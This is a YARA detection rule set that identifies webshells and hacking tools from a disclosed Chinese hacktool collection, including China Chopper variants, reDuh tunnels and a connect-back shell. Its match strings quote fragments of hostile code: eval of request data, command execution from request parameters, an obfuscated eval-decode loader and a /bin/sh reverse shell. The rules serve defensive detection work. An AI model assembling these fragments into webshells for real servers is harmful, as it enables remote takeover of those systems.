/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2015-06-13
    Identifier: CN-Tools Webshells
    Reference: Diclosed hacktool set at http://w2op.us/ (Mirror: http://tools.zjqhr.com)
*/


rule Tools_cmd {
    meta:
        id = "44nbmT7EsSnGk6khC35cVq"
        fingerprint = "v1_sha256_fe1a157d53bd9a48848f2711844c5e12356652ca01c84c19429c55bbb12ea488"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file cmd.jSp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "02e37b95ef670336dc95331ec73dbb5a86f3ba2b"

    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
        $s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
        $s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
        $s4 = "while((a=in.read(b))!=-1){" fullword ascii
        $s5 = "out.println(new String(b));" fullword ascii
        $s6 = "out.print(\"</pre>\");" fullword ascii
        $s7 = "out.print(\"<pre>\");" fullword ascii
        $s8 = "int a = -1;" fullword ascii
        $s9 = "byte[] b = new byte[2048];" fullword ascii
    condition:
        filesize < 3KB and 7 of them
}


rule trigger_drop {
    meta:
        id = "6XVSGBIOqqg5J0oDw9m0Kp"
        fingerprint = "v1_sha256_fc998ea5c2a446278823e4336ddc6a22741f82c43fbdcd95b3d12ee6a27b1dd7"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file trigger_drop.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "165dd2d82bf87285c8a53ad1ede6d61a90837ba4"

    strings:
        $s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
        $s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
        $s2 = "@mssql_query('DROP TRIGGER" ascii
        $s3 = "if(empty($_GET['returnto']))" fullword ascii
    condition:
        filesize < 5KB and all of them
}

rule InjectionParameters {
    meta:
        id = "WLvVknm0cZ0jmrZU1HqL"
        fingerprint = "v1_sha256_6bb786256f7154013408323eeb597f91c609a2a26f5ae9e6d61e16bd9c16a577"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file InjectionParameters.vb"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "4f11aa5b3660c45e527606ee33de001f4994e1ea"

    strings:
        $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
        $s1 = "Public Class InjectionParameters" fullword ascii
    condition:
        filesize < 13KB and all of them
}

rule users_list {
    meta:
        id = "73gMqNcaZcnd26cQLvuBFW"
        fingerprint = "v1_sha256_debd8e1d882cbbe6e720b86bec3ff3c78393cb225b3f0f9c7725cfced6582e71"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file users_list.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "6fba1a1a607198ed232405ccbebf9543037a63ef"

    strings:
        $s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
        $s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
        $s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii
    condition:
        filesize < 12KB and all of them
}

rule function_drop {
    meta:
        id = "1seVgXm81HG01oEQLKPN0C"
        fingerprint = "v1_sha256_5f643c0924e309c708b9987b253666af5c3b4e6140848bdf7f0dd6ca39178694"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file function_drop.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "209098c494ce10d82d1c2002488509c5e8983182"

    strings:
        $s0 = "@mssql_query('DROP FUNCTION ' . urldecode($_GET['function']) . ';') or" ascii
        $s1 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
        $s2 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
        $s3 = "if(empty($_GET['returnto']))" fullword ascii
    condition:
        filesize < 5KB and all of them
}

rule table_export_download {
    meta:
        id = "3IIAHswsYGydEPPkFFuw1q"
        fingerprint = "v1_sha256_b4fcf597672f0e479df6acc652c23526fb34cdb88ca50e45ad9a5755d26a8abc"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file table_export_download.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "2758e553d1059bdbc4e3993dd6f46218fc26103d"

    strings:
        $s0 = "header('Content-Disposition: attachment; filename=\"' . $_SESSION['database'] . " ascii
        $s1 = "header('Content-Length: ' . strlen($_POST['data']));" fullword ascii
        $s2 = "header('Content-type: application/x-download');" fullword ascii
        $s3 = "echo $_POST['data'];" fullword ascii
    condition:
        filesize < 5KB and all of them
}

rule trigger_modify {
    meta:
        id = "3WbqE5VG8T4EJZ0dTloE49"
        fingerprint = "v1_sha256_6ea0221af9e9a29d3280a01eec69e31e79c358e664d286f8c80259f5e826876c"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file trigger_modify.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "c93cd7a6c3f962381e9bf2b511db9b1639a22de0"

    strings:
        $s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
        $s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
        $s3 = "if($_POST['query'] != '')" fullword ascii
        $s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
        $s5 = "<b>Modify Trigger</b>" fullword ascii
    condition:
        filesize < 15KB and all of them
}

rule Customize {
    meta:
        id = "6q6ondNSx26BPqjwJYf6VT"
        fingerprint = "v1_sha256_f4e0a7342a01411ae060c9d995072518f2e3299af1b0d396bb319eeec42c1519"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file Customize.aspx"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "db556879dff9a0101a7a26260a5d0dc471242af2"

    strings:
        $s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
        $s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
        $s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
        $s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii
    condition:
        filesize < 24KB and all of them
}

rule database_export {
    meta:
        id = "1wgfCW5PoT6Pia31WKCKlY"
        fingerprint = "v1_sha256_58acd73e9df25af60e38674f69e88d690ecbf0a41355b2cac5f86fc39c6bb3b7"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file database_export.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "edcf8ef761e7e09a6a4929ccbc2aa04c7011ae53"

    strings:
        $s0 = "header('Content-Length: ' . strlen($masterquery));" fullword ascii
        $s3 = "echo '<form name=\"form1\" method=\"post\" action=\"database_export_download.php" ascii
        $s7 = "if(substr_count($_POST['tables'][$counter],'.') > 0)" fullword ascii
        $s19 = "<input type=\"hidden\" name=\"doexport\" value=\"yes\">" fullword ascii
    condition:
        filesize < 100KB and all of them
}

rule mobile_index {
    meta:
        id = "5ejVofoRf56rc3OpCdAELM"
        fingerprint = "v1_sha256_5705f256d5f2ed0ab66461bc72c791b5b86e16cfb4f4df0aa30c3c20b94e8e3c"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file index.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "353239a2116385aa2036a9748b8d2e9b7454bede"

    strings:
        $s0 = "$c = @mssql_connect($_POST['datasource'],$_POST['username'],$_POST['password']) " ascii
        $s1 = "<form name=\"form1\" method=\"post\" action=\"index.php\">" fullword ascii
        $s2 = "$_SESSION['datasource_password'] = $_POST['password'];" fullword ascii
        $s3 = "<b>Username:</b>" fullword ascii
    condition:
        filesize < 21KB and all of them
}

rule oracle_data {
    meta:
        id = "7bUVWY0QsR5XpLuSka3Ayj"
        fingerprint = "v1_sha256_1ab9b6c4349dd891103a24a77c93c2abb784d3ed616523f3aaec68b05082983e"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file oracle_data.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "6cf070017be117eace4752650ba6cf96d67d2106"

    strings:
        $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
        $s1 = "if(isset($_REQUEST['id']))" fullword ascii
        $s2 = "$id=$_REQUEST['id'];" fullword ascii
    condition:
        all of them
}

rule reDuhServers_reDuh {
    meta:
        id = "6g5W4racfGQN5ttG3PGUoq"
        fingerprint = "v1_sha256_dcb1515da696566d01ec64029a34438a56d2df480b9cd2ea586f71ffe3324c1a"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file reDuh.jsp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "377886490a86290de53d696864e41d6a547223b0"

    strings:
        $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
        $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
        $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
    condition:
        filesize < 116KB and all of them
}

rule item_old {
    meta:
        id = "4Z3TsCfVYXORYcLebnS384"
        fingerprint = "v1_sha256_181e46408050490dccc4f321bd1072da0436d920e16cc4711b16425eb5bd73ed"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file item-old.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "daae358bde97e534bc7f2b0134775b47ef57e1da"

    strings:
        $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
        $s3 = "$sHash = md5($sURL);" fullword ascii
    condition:
        filesize < 7KB and 2 of them
}

rule Tools_2014 {
    meta:
        id = "4Z46DLAySLHop45ylp1ecV"
        fingerprint = "v1_sha256_caa365cc1a641b7dcd5d2082240d981e66caf6da1379ee109a0bb1f651d1f00f"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file 2014.jsp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "74518faf08637c53095697071db09d34dbe8d676"

    strings:
        $s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
    condition:
        filesize < 715KB and all of them
}

rule reDuhServers_reDuh_2 {
    meta:
        id = "4yegASjybiPlq9z69yvWph"
        fingerprint = "v1_sha256_954115da374b6d72c35244673799be6e8bae5288f53509dea04e3ae3c489af12"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file reDuh.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "512d0a3e7bb7056338ad0167f485a8a6fa1532a3"

    strings:
        $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
        $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
        $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
    condition:
        filesize < 57KB and all of them
}

rule Customize_2 {
    meta:
        id = "47K66hJDhxx30b7dg0Fd3i"
        fingerprint = "v1_sha256_aa0940a21eea6ba50a93dd36a8f914f636fdba0685048fc67e16dd68c1c2794e"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file Customize.jsp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "37cd17543e14109d3785093e150652032a85d734"

    strings:
        $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
        $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
    condition:
        filesize < 30KB and all of them
}

rule ChinaChopper_one {
    meta:
        id = "38RjOIWzL6EKigUCs1IquK"
        fingerprint = "v1_sha256_c6472b41c457276775accba61a707d7dc5bad701b562b0a70e1c32430f58019c"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file one.asp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "6cd28163be831a58223820e7abe43d5eacb14109"

    strings:
        $s0 = "<%eval request(" fullword ascii
    condition:
        filesize < 50 and all of them
}

rule CN_Tools_old {
    meta:
        id = "1aVXlqWGR8dgdRMkwBTYl2"
        fingerprint = "v1_sha256_3f0ac357e9a9fb4ee937b53145b33ba1041310d979cbc3feb0a4caf026b9b730"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file old.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "f8a007758fda8aa1c0af3c43f3d7e3186a9ff307"

    strings:
        $s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
        $s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
        $s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
    condition:
        filesize < 6KB and all of them
}

rule item_301 {
    meta:
        id = "3VZrwjwG05Op7oGUGfsPMe"
        fingerprint = "v1_sha256_623e235ff3eb0922fe8aee732144a15bcc0c580229654ae988353176f488b085"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file item-301.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "15636f0e7dc062437608c1f22b1d39fa15ab2136"

    strings:
        $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
        $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
        $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
        $s4 = "$sURL = $aArg[0];" fullword ascii
    condition:
        filesize < 3KB and 3 of them
}

rule CN_Tools_item {
    meta:
        id = "6EZEKRtAdujUnIuPHW2ymT"
        fingerprint = "v1_sha256_1e927fd093aa11ad525f3f64d657f314520669b4237eac8f87d0be53cd848044"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file item.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "a584db17ad93f88e56fd14090fae388558be08e4"

    strings:
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s3 = "$sWget=\"index.asp\";" fullword ascii
        $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
    condition:
        filesize < 4KB and all of them
}

rule f3_diy {
    meta:
        id = "3vXbe0lEUiaE212janoHdR"
        fingerprint = "v1_sha256_37d6bc61d790ff30c98ded08ff875431fda525cd3ac10b4b1ba3f8f42167ed8c"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file diy.asp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "f39c2f64abe5e86d8d36dbb7b1921c7eab63bec9"

    strings:
        $s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
        $s5 = ".black {" fullword ascii
    condition:
        uint16(0) == 0x253c and filesize < 10KB and all of them
}

rule ChinaChopper_temp {
    meta:
        id = "XKExyj6enypkWf5Q07nR4"
        fingerprint = "v1_sha256_3669dfa10867970456f6638035a87d448e2b728387fbd07b59ffd981a1ab6200"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file temp.asp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "b0561ea52331c794977d69704345717b4eb0a2a7"

    strings:
        $s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
        $s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
        $s2 = "o.language = \"vbscript\"" fullword ascii
        $s3 = "o.addcode(Request(\"SC\"))" fullword ascii
    condition:
        filesize < 1KB and all of them
}

rule Tools_2015 {
    meta:
        id = "6heYIaFZwh99KoNhlfHXiC"
        fingerprint = "v1_sha256_2b93ef42c277fd8415cf89bf1bef3e841c56a2b4aa1507d99b84cd8adc9a0644"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file 2015.jsp"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "8fc67359567b78cadf5d5c91a623de1c1d2ab689"

    strings:
        $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
        $s4 = "System.out.println(Oute.toString());" fullword ascii
        $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
        $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
        $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
    condition:
        filesize < 7KB and all of them
}

rule ChinaChopper_temp_2 {
    meta:
        id = "3V38iFATcUX4Lmi4yipHhw"
        fingerprint = "v1_sha256_1b6d840797afcdbf7c72836557dbd486780c760471e79133810346c301cca80b"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file temp.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "604a4c07161ce1cd54aed5566e5720161b59deee"

    strings:
        $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
    condition:
        filesize < 150 and all of them
}

rule templatr {
    meta:
        id = "2KIYchLSFCoNETy3iaysOk"
        fingerprint = "v1_sha256_80d207ee47c0c602ddd281e0e187b83cdb4f1385f4b46ad2a4f5630b8f9e96a1"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file templatr.php"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "759df470103d36a12c7d8cf4883b0c58fe98156b"

    strings:
        $s0 = "eval(gzinflate(base64_decode('" ascii
    condition:
        filesize < 70KB and all of them
}

rule reDuhServers_reDuh_3 {
    meta:
        id = "2nsOqFnDP6gsGUtpghsYIX"
        fingerprint = "v1_sha256_5a3bc023e0e8a5ccc8ee8e1b5e7ee0fca64e3f92b72d0aad15b25c82a23da487"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file reDuh.aspx"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "0744f64c24bf4c0bef54651f7c88a63e452b3b2d"

    strings:
        $s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
        $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
        $s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
        $s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
    condition:
        filesize < 40KB and all of them
}

rule ChinaChopper_temp_3 {
    meta:
        id = "2eVf1T84akhjmzv3uIv7t7"
        fingerprint = "v1_sha256_6a0d7817607362f325957e30cace24d32635b7e0411e161588ee573118f91b6a"
        version = "1.0"
        date = "2015-06-13"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - file temp.aspx"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"

    strings:
        $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
        $s1 = "\"],\"unsafe\");%>" ascii
    condition:
        uint16(0) == 0x253c and filesize < 150 and all of them
}

rule Shell_Asp {
    meta:
        id = "ZwSgmUJ2qBbFjhvdx6kYv"
        fingerprint = "v1_sha256_47c5c242713446471d5da4d9245b99561c26ad7fa016059076a6f0acab542c3c"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set Webshells - file Asp.html"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "5e0bc914ac287aa1418f6554ddbe0ce25f2b5f20"

    strings:
        $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
        $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
        $s3 = "function Command(cmd, str){" fullword ascii
    condition:
        filesize < 100KB and all of them
}


rule Txt_aspxtag {
    meta:
        id = "NEqBrlmOrXdsQVzYDoqZE"
        fingerprint = "v1_sha256_6ffeee18945cab96673e4b9efc143017d168be12b794fa26aa4a304f15ae8e13"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file aspxtag.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "42cb272c02dbd49856816d903833d423d3759948"

    strings:
        $s1 = "String wGetUrl=Request.QueryString[" fullword ascii
        $s2 = "sw.Write(wget);" fullword ascii
        $s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii
    condition:
        filesize < 2KB and all of them
}

rule Txt_php {
    meta:
        id = "7W62IcdqXQeqVO2BxHGl3v"
        fingerprint = "v1_sha256_ace26e7c0dca285febf6b9192cbe59cc7e55e80f2f4e1a99aba25afcbeadeec1"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file php.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "eaa1af4b898f44fc954b485d33ce1d92790858d0"

    strings:
        $s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
        $s2 = "gzuncompress($_SESSION['api']),null);" ascii
        $s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
        $s4 = "if(empty($_SESSION['api']))" fullword ascii
    condition:
        filesize < 1KB and all of them
}

rule Txt_aspx1 {
    meta:
        id = "3OzUieuYo9nnFP1g7qtCzZ"
        fingerprint = "v1_sha256_20bdadd6c8b61ab14f6280f55a90f541bf65c33675f979ebe489cc3967438e15"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file aspx1.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"

    strings:
        $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item["
        $s1 = "],\"unsafe\");%>" fullword ascii
    condition:
        filesize < 150 and all of them
}

rule Txt_shell {
    meta:
        id = "7bXj1HnvPRBLBOwChr7Egv"
        fingerprint = "v1_sha256_020e9e6ef776a9d69939fa3dec771dc516b0184086738bab439063acca89bd76"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file shell.c"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "8342b634636ef8b3235db0600a63cc0ce1c06b62"

    strings:
        $s1 = "printf(\"Could not connect to remote shell!\\n\");" fullword ascii
        $s2 = "printf(\"Usage: %s <reflect ip> <port>\\n\", prog);" fullword ascii
        $s3 = "execl(shell,\"/bin/sh\",(char *)0);" fullword ascii
        $s4 = "char shell[]=\"/bin/sh\";" fullword ascii
        $s5 = "connect back door\\n\\n\");" fullword ascii
    condition:
        filesize < 2KB and 2 of them
}

rule Txt_asp {
    meta:
        id = "3cCmVNg8sMowAtLtCWxOgK"
        fingerprint = "v1_sha256_9eab239310fbebe8c88cbf8d0ee4123b8f3e2ebe601949e1e984e9cfde9869e7"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file asp.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "a63549f749f4d9d0861825764e042e299e06a705"

    strings:
        $s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
        $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
    condition:
        uint16(0) == 0x253c and filesize < 100KB and all of them
}

rule Txt_asp1 {
    meta:
        id = "11ukCdvVTJVXTYfnVRUIvB"
        fingerprint = "v1_sha256_77a4409b852d24228b0e1701f1ccc2abe3930c2c7240a43796b23042e706d9bf"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file asp1.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "95934d05f0884e09911ea9905c74690ace1ef653"

    strings:
        $s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
